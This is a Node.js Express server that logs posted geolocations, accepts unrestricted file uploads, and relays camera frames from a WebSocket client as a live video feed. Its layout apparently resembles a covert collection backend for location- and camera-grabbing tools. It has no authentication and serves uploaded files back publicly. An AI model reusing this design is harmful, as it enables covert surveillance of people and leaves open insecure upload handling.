const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const morgan = require('morgan');
const app = express();
const WebSocket = require('ws');
const PORT = 2020;
const UPLOAD_FOLDER = path.join(__dirname, "uploads");
const UPLOAD_AUDIOS = path.join(__dirname,"audios");
const LOG_FILE = path.join(__dirname, "locations.log");
if (!fs.existsSync(UPLOAD_FOLDER)) {
  fs.mkdirSync(UPLOAD_FOLDER);
}
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, ""); 
}
if(!fs.existsSync(UPLOAD_AUDIOS)){
    fs.mkdirSync(UPLOAD_AUDIOS);
}
app.use(morgan('dev'));
app.use(express.json());  
app.use(express.text());      
app.use("/uploads", express.static(UPLOAD_FOLDER));
app.use(express.static('templates')); 
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, UPLOAD_FOLDER);
  },
  filename: function (req, file, cb) {
    const timestamp = new Date().toISOString().replace(/[-:.TZ]/g, "_");
    const safeName = file.originalname.replace(/\s+/g, "_");
    cb(null, `${timestamp}_${safeName}`);
  },
});
const upload = multer({ storage: storage });
app.post("/get-location", (req, res) => {
  try {
    const location = req.body;
    if (!location || !location.lat || !location.lng) {
      return res.status(400).json({ success: false, message: "Invalid location data" });
    }
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] 
Source: ${location.source || "unknown"}
Latitude: ${location.lat}
Longitude: ${location.lng}
City: ${location.city || "N/A"}
Country: ${location.country || "N/A"}
-----------------------------------
`;
    fs.appendFileSync(LOG_FILE, logEntry);
    res.status(200).json({ success: true, message: "Location saved successfully" });
  } catch (err) {
    console.error("Error saving location:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});
app.post("/upload", upload.array("files"), (req, res) => {
  if (!req.files || req.files.length === 0) {
    return res.status(400).json({ success: false, message: "No files uploaded" });
  }
  res.status(200).json({
    success: true,
    files: req.files.map(f => ({
      filename: f.filename,
      path: `/uploads/${f.filename}`
    }))
  });
});
app.listen(PORT,'0.0.0.0',()=>console.log(`Server running at: http://0.0.0.0:${PORT}`));
const wss = new WebSocket.Server({  
   host: '0.0.0.0',
  port: 8765  
});
let latestFrame = null;
wss.on('connection', ws => {
  console.log('Python connected');
  ws.on('message', (data) => {
    latestFrame = data; 
  });
});
app.get('/video_feed', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
    'Cache-Control': 'no-cache',
    'Connection': 'close'
  });
  const interval = setInterval(() => {
    if (!latestFrame) return;
    res.write(`--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${latestFrame.length}\r\n\r\n`);
    res.write(latestFrame);
    res.write('\r\n');
  }, 33); 
  req.on('close', () => clearInterval(interval));
});